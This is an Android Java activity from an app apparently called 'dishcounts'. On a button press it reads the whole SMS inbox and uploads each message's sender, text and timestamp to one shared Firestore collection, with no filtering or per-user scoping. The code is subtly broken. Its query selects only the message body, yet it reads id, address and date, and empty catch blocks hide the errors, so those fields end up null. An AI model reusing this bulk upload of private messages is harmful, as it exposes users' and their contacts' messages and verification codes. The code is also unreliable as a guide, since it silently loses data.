package android.com.dishcounts.Activities;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.com.dishcounts.JavaClasses.SMSObject;
import android.com.dishcounts.R;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SMSFetchActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_smsfetch);
    }

    private List<SMSObject> getSMS() {
        List<String> lstSms = new ArrayList<String>();
        ContentResolver cr = getApplicationContext().getContentResolver();
        SMSObject sms_object;
        List<SMSObject> list_messages = new ArrayList<SMSObject>();

        Cursor c = cr.query(Telephony.Sms.Inbox.CONTENT_URI, // Official CONTENT_URI from docs
                new String[] { Telephony.Sms.Inbox.BODY }, // Select body text
                null,
                null,
                Telephony.Sms.Inbox.DEFAULT_SORT_ORDER); // Default sort order

        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                lstSms.add(c.getString(0));
                sms_object = new SMSObject();
                try{
                    sms_object.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                }
                catch (Exception e) { };
                try{
                    sms_object.setAddress(c.getString(c.getColumnIndexOrThrow("address")));
                }
                catch (Exception e){};
                try{
                    sms_object.setMsg_body(c.getString(c.getColumnIndexOrThrow("body")));
                }
                catch (Exception e){};
                try{
                    sms_object.setTime_string(c.getString(c.getColumnIndexOrThrow("date")));
                }
                catch (Exception e){};
                list_messages.add(sms_object);
                c.moveToNext();
            }
        } else {
            throw new RuntimeException("You have no SMS in Inbox");
        }
        c.close();

        return list_messages;
    }


    public void getMessagesFromInbox(View v){
        List<SMSObject> sms = getSMS();
        Log.d("SMDFIREBASE", "CAME IN" + Integer.toString(sms.size()));
        for (SMSObject single_sms : sms){
            Map<String, Object> smsData = new HashMap<>();
            smsData.put("sender", single_sms.getAddress());
            smsData.put("text", single_sms.getMsg_body());
            smsData.put("timestamp", single_sms.getTime_string());
            FirebaseFirestore db = FirebaseFirestore.getInstance();
            db.collection("/sms_messages")
                    .add(smsData)
                    .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
                        @Override
                        public void onSuccess(DocumentReference documentReference) {
                            Log.d("SMDFIREBASE", "DocumentSnapshot added with ID: " + documentReference.getId());
                        }
                    })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.w("SMDFIREBASE", "Error adding document", e);
                        }
                    });
        }
    }
}
